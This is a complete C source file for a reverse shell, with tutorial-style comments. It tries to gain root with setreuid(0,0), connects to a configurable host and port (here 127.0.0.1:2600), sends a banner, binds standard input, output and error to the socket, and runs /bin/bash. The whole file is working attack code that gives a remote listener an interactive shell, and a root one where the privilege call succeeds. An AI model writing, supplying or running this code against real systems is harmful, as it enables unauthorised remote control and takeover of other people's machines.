#include <stdio.h>
#include <string.h>
#include <unistd.h>//POSIX Support
#include <arpa/inet.h>

#define HOST "127.0.0.1"
#define PORT 2600

#define MOTD "############# Reverse Shell ################"

int main(int argc, char *argv[]) {

    struct sockaddr_in dest;
    int sock;

    // Get maximum privileges (ie root).
    setreuid(0,0);

    // Create socket file descriptor.
    sock = socket(AF_INET, SOCK_STREAM, 0);

    // Populate dest with relevant data.
    dest.sin_family = AF_INET;  //AF = Address Family, INET = Internet
    dest.sin_addr.s_addr = inet_addr(HOST); //helps with Endianness
    dest.sin_port = htons(PORT); //helps with Endianness

    // Create a TCP connection. If connection fails, exit.
    int result = connect(sock, (struct sockaddr *)&dest,sizeof(struct sockaddr));
    if(result != 0)
    {
        puts("Unable to establish connection!");
        return 1;
    }

    //MOTD
    write(sock, MOTD, strlen(MOTD));

    // Connect stdin, stdout and stderr to sock.
    dup2(sock, 0);
    dup2(sock, 1);
    dup2(sock, 2);

    // Run shell with all input and output going over sock.
    execve("/bin/bash", NULL, NULL);//or bin/sh or bin/dash or ...

    return 0;
}
